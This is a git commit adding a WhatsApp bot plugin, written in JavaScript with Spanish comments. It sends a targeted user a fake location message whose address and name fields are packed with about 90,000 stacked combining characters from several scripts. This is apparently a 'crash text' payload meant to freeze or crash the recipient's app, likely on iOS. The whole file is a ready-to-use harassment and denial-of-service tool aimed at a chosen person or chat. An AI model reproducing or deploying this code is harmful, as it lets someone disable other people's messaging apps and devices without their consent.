d9729ce309af24dd4b0658029930ec55010ed076
Tobiprueba <virtualvirtuales538@gmail.com>
2025-07-08 00:44:15 -0600

    Add files via upload

---
+++ plugins/tools-pruebaios.js
@@ -0,0 +1,38 @@
+let handler = async (m, { conn }) => {
+  const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat
+  if (jid === conn.user.id) return conn.sendMessage(m.chat, { text: '❌ No puedo enviármelo a mí mismo.' }, { quoted: m })
+
+  const objetivo = jid
+
+  const caracter = 'ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵'
+  const repeticiones = 266
+  const caracteresPorRepeticion = caracter.length // 336
+  const totalBase = repeticiones * caracteresPorRepeticion // 89,376
+  const faltan = 90000 - totalBase // 624
+
+  const textoLargo = caracter.repeat(repeticiones) + caracter.slice(0, faltan)
+
+  const fakeLoc = {
+    key: {
+      fromMe: false,
+      participant: "0@s.whatsapp.net",
+      ...(m.chat ? { remoteJid: "status@broadcast" } : {})
+    },
+    message: {
+      locationMessage: {
+        name: 'C•137DOMINA+ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵',
+        degreesLatitude: 0,
+        degreesLongitude: 0,
+        address: textoLargo,
+        jpegThumbnail: Buffer.alloc(0)
+      }
+    }
+  }
+
+  await conn.relayMessage(objetivo, fakeLoc.message, { messageId: generateMessageID() })
+}
+
+handler.command = /^ubifalsa|ubicacionfalsa|fakelocation$/i
+handler.owner = true
+
+export default handler
